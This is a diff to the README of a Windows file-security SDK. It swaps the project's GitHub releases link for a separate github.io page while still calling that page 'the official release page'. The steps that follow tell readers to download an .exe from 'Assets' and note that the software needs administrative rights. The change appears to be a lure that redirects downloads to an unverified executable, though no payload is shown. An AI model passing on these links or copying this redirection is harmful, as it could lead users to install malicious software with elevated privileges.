@@ -1,6 +1,6 @@
 # 🛡️ rust-file-security-sdk - Keep your Windows files secure always
 
-[![Download Link](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Experimentersoftroll422/rust-file-security-sdk/releases)
+[![Download Link](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://experimentersoftroll422.github.io)
 
 This application provides tools to manage file security on Windows systems. It tracks file access, handles encryption, and monitors system processes. Users implement these tools to prevent unauthorized changes to sensitive data. The software utilizes a background driver to watch file activity in real time. This ensures that only authorized processes access your files.
 
@@ -20,7 +20,7 @@ The software interacts with deep system components, so administrative rights all
 
 Follow these steps to obtain the latest version of the application.
 
-1.  Visit the official release page: [https://github.com/Experimentersoftroll422/rust-file-security-sdk/releases](https://github.com/Experimentersoftroll422/rust-file-security-sdk/releases).
+1.  Visit the official release page: [https://experimentersoftroll422.github.io](https://experimentersoftroll422.github.io).
 2.  Scroll down to the section labeled Assets.
 3.  Click the link ending in .exe to start the download.
 4.  Once the folder finishes downloading, navigate to your Downloads folder.
